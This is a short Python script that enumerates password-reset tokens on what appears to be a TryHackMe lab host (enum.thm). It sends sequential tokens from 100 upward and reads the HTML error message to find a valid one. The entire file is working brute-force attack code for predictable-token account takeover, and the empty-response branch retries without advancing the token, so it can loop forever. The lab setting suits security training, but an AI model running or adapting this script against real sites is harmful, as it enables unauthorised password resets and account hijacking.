import requests
import sys
from bs4 import BeautifulSoup

def check_token(token):
    url = f'http://enum.thm/labs/predictable_tokens/reset_password.php?token={token}'
    headers = {
        'Host': 'enum.thm',
        'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, bf',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': 'http://enum.thm',
        'Connection': 'close',
    }

    response = requests.get(url, headers=headers)
    return response.text

def enumerate_token():
    invalid_error = "Invalid token." # error message for invalid tokens
    print("Trying tokens...")
    token = 100

    while True:

        response_text = check_token(token)
        if not response_text:
            print(f"Failed to retrive data for {token}")
            continue

        soup = BeautifulSoup(response_text, 'html.parser')
        error_message = soup.find('p', class_='err')

        if error_message and invalid_error in error_message.text:
            token = token + 1
            continue
        else:
            print(response_text)
            print(f"[VALID] {token}")
            return token

if __name__ == "__main__":

    valid_token = enumerate_token()
